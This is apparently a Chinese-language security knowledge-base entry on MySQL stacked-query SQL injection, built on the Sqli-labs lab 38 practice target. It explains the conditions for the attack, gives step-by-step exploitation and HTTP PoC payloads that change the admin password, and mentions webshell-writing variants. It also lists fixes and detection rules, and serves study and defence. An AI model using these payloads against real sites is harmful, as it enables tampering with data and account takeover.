---
id: web-generic-sqli-stacked-query-statement-chaining
title: MySQL 堆叠注入：分号结束原查询后追加 UPDATE/INSERT/DDL 任意语句（mysqli_multi_query 前提）
type: scenario
domain: web
path: web/generic/sqli
technique: sqli-stacked-query-statement-chaining
tags:
- sqli
- stacked-query
- mysql
- multi-query
- update
- web
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-12'
verification:
  verified_by: verifier-V554
  verified_at: '2026-11-12T00:17:54+08:00'
  notes: 已对照原文与图52核对：MySQL需mysqli_multi_query才能多语句、Sqli-labs 38可先union判列、payload id=1';update users set password='test123456' where username='admin';--+ 执行后admin密码变为test123456，均一致；已修正卡内“用admin/test123456登录成功”的表述为原文实际做法“回查users表确认密码已改”（原文未演示登录成功）。堆叠探测select sleep(3)属通用补充。dedup除自身外候选360webscan堆叠写马、stacked-file-table任意读、SeaCMS后台执行等均为特定场景，非同链；dup-scan无相关pair。原文未给组件版本，未设affected_versions；PoC未在本机执行。
url: /docs/web/generic/sqli/web-generic-sqli-stacked-query-statement-chaining/
draft: false
kb_aliases:
- 堆叠注入
- stacked queries
- 分号多语句注入
- mysqli_multi_query 注入
- 堆叠 UPDATE 改密码
- 堆叠注入改数据
---

## 一句话结论

当后端使用 `mysqli_multi_query()`（或支持多语句的 PDO 配置）执行用户拼接的 SQL 且未过滤分号时，可以在原查询后用 `;` 结束并追加任意语句——UPDATE 改密码、INSERT 加管理员、DELETE 删数据、DDL 建表/删表，甚至 `INTO OUTFILE` 写 WebShell；Sqli-labs 第 38 关用 `?id=1';update users set password='test123456' where username='admin';--+` 直接把 admin 的密码改掉，权限不再受原 SELECT 语句限制。

## 原理

- **多语句执行开关**：MySQL 协议允许一次请求携带多条以 `;` 分隔的语句，但 PHP 侧默认不开启——`mysql_query()` 只执行第一条，`mysqli_query()` 也只执行单条；只有 `mysqli_multi_query()`（或 PDO 连接未禁用多语句时的 `query()`）会把分号后的语句继续交给数据库执行。
- **权限升级**：原 SQL 是 `SELECT ... WHERE id='$id' LIMIT 0,1`，常规注入只能在 SELECT 语法内做 union/盲注；分号后的语句是全新的 SQL，可以是 UPDATE/INSERT/DELETE/CREATE/DROP，操作类型与影响范围都跳出了原语句约束。
- **结果集只回显第一条**：多语句执行时 API 通常只取第一结果集，页面仍只显示原查询结果；后续语句无回显，但已真实写库，需要通过再次查询（如登录）验证。
- **为什么条件苛刻**：需要后端 API 支持多语句 + 应用未过滤分号 + 数据库账号对目标表有写权限；三个条件缺一不可，因此实战中比 union/盲注少见，但一旦成立危害直接落到数据完整性。

## 触发条件

- 后端使用 `mysqli_multi_query()` 或等价的 multi-statement API/配置执行拼接 SQL。
- 注入参数未过滤 `;`（或过滤可绕过），且引号闭合可控。
- 数据库账号对目标表/库有 UPDATE/INSERT/DELETE/DDL 权限（非只读账号）。
- 追加语句的语法与当前数据库版本兼容（如 MySQL 不支持在堆叠里再写存储过程外的复杂控制流）。

## 利用步骤

1. 先按普通注入确认闭合与注入存在（Sqli-labs 38：`?id=1'` 报错、`?id=1'--+` 正常）。
2. 判断是否支持堆叠：尝试 `?id=1';select sleep(3);--+`，若延迟则 multi-query 开启。
3. 构造 UPDATE 改密码：`?id=1';update users set password='test123456' where username='admin';--+`。
4. 再次查询数据库确认写入（原文示例为回看 users 表：admin 的 password 已变为 test123456），验证堆叠语句真实执行。
5. 按目标改用途：INSERT 加管理员、UPDATE 改角色/余额、`INTO OUTFILE` 写文件、DDL 建表存数据等。

## PoC

```http
# 判断堆叠：延迟 3 秒说明分号后的语句被执行
GET /Less-38/?id=1';select sleep(3);--+ HTTP/1.1

# 堆叠 UPDATE：把 admin 密码改为 test123456
GET /Less-38/?id=1';update users set password='test123456' where username='admin';--+ HTTP/1.1
```

```sql
-- 数据库实际执行的两条语句
SELECT * FROM users WHERE id='1';
update users set password='test123456' where username='admin';
```

执行后回查 users 表可见 admin 的 password 已变为 test123456（原密码 admin 失效）；登录验证需在目标业务允许时另做。

## 变体与关联

- 变体：堆叠 `SELECT ... INTO OUTFILE '/var/www/html/shell.php'` 写 WebShell（[[web-generic-sqli-360webscan-stacked-outfile-webshell]]、[[web-generic-sqli-order-by-into-outfile-filename-webshell]]）。
- 变体：堆叠 UPDATE 改写文件表路径，再借下载接口任意文件读取（[[web-generic-sqli-stacked-file-table-arbitrary-file-read]]）；MSSQL 堆叠开启 `xp_cmdshell` 执行系统命令（[[web-generic-sqli-mssql-stacked-xp-cmdshell]]）。
- 变体：无回显时配合时间盲注确认 UPDATE 是否生效（如堆叠 `select sleep()` 或改后重查）。
- 关联：[[web-generic-sqli-union-seven-step-extraction]]（不支持堆叠时的常规提取路径）、[[web-generic-sqli-second-order-injection]]（另一条「先写库、后触发」的注入路径）。
- 边界：`mysqli_query`/`mysql_query` 不支持多语句；部分 WAF 会直接拦截分号或多个 SQL 关键字；数据库账号只读时 UPDATE/DDL 失败。

## 检测与防御

- 修复：参数化查询/预编译；确认数据库访问层使用单语句 API（`mysqli_query`），或在连接层禁用多语句（PDO `PDO::MYSQL_ATTR_MULTI_STATEMENTS => false`）。
- 加固：数据库账号按业务最小权限（只读业务不给写权限）；WAF 拦截分号 + 多语句关键字组合。
- 检测：数据库日志/审计中出现同一连接内多条语句（SELECT 后跟 UPDATE/INSERT/DDL）；应用日志参数中出现 `;` 与 `update/insert/delete/create` 关键字；数据异常变更（管理员密码、权限表）告警。
